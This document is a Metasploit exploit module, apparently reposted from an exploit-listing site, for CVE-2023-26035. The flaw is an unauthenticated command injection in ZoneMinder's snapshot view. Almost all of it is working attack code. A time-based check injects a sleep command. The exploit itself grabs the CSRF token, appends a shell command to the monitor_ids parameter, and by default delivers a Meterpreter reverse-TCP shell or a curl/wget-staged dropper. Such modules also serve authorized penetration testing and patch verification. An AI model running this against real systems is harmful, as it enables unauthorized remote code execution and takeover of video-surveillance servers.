## https://sploitus.com/exploit?id=1337DAY-ID-39149
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
#
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Exploit::Remote::AutoCheck
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'ZoneMinder Snapshots Command Injection',
        'Description' => %q{
          This module exploits an unauthenticated command injection
          in zoneminder that can be exploited by appending a command
          to the "create monitor ids[]"-action of the snapshot view.
          Affected versions: < 1.36.33, < 1.37.33
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'UnblvR',    # Discovery
          'whotwagner' # Metasploit Module
        ],
        'References' => [
          [ 'CVE', '2023-26035' ],
          [ 'URL', 'https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-72rg-h4vf-29gr']
        ],
        'Privileged' => false,
        'Platform' => ['linux', 'unix'],
        'Targets' => [
          [
            'nix Command',
            {
              'Platform' => ['unix', 'linux'],
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/linux/http/x64/meterpreter/reverse_tcp',
                'FETCH_WRITABLE_DIR' => '/tmp'
              }
            }
          ],
          [
            'Linux (Dropper)',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X64],
              'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' },
              'Type' => :linux_dropper
            }
          ],
        ],
        'CmdStagerFlavor' => [ 'bourne', 'curl', 'wget', 'printf', 'echo' ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2023-02-24',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'The ZoneMinder path', '/zm/'])
    ])
  end

  def check
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'method' => 'GET'
    )
    return Exploit::CheckCode::Unknown('No response from the web service') if res.nil?
    return Exploit::CheckCode::Safe("Check TARGETURI - unexpected HTTP response code: #{res.code}") if res.code != 200

    unless res.body.include?('ZoneMinder')
      return Exploit::CheckCode::Safe('Target is not a ZoneMinder web server')
    end

    csrf_magic = get_csrf_magic(res)
    # This check executes a sleep-command and checks the response-time
    sleep_time = rand(5..10)
    data = "view=snapshot&action=create&monitor_ids[0][Id]=0;sleep #{sleep_time}"
    data += "&__csrf_magic=#{csrf_magic}" if csrf_magic
    res, elapsed_time = Rex::Stopwatch.elapsed_time do
      send_request_cgi(
        'uri' => normalize_uri(target_uri.path, 'index.php'),
        'method' => 'POST',
        'data' => data.to_s,
        'keep_cookies' => true
      )
    end
    return Exploit::CheckCode::Unknown('Could not connect to the web service') unless res

    print_status("Elapsed time: #{elapsed_time} seconds.")
    if sleep_time < elapsed_time
      return Exploit::CheckCode::Vulnerable
    end

    Exploit::CheckCode::Safe('Target is not vulnerable')
  end

  def execute_command(cmd, _opts = {})
    command = Rex::Text.uri_encode(cmd)
    print_status('Sending payload')
    data = "view=snapshot&action=create&monitor_ids[0][Id]=;#{command}"
    data += "&__csrf_magic=#{@csrf_magic}" if @csrf_magic
    send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'method' => 'POST',
      'data' => data.to_s
    )
    print_good('Payload sent')
  end

  def exploit
    # get magic csrf-token
    print_status('Fetching CSRF Token')
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'method' => 'GET'
    )

    if res && res.code == 200
      # parse token
      @csrf_magic = get_csrf_magic(res)
      unless @csrf_magic =~ /^key:[a-f0-9]{40},\d+/
        fail_with(Failure::UnexpectedReply, 'Unable to parse token.')
      end
    else
      fail_with(Failure::UnexpectedReply, 'Unable to fetch token.')
    end
    print_good("Got Token: #{@csrf_magic}")
    # send payload
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager
    end
  end

  private

  def get_csrf_magic(res)
    return if res.nil?

    res.get_html_document.at('//input[@name="__csrf_magic"]/@value')&.text
  end
end
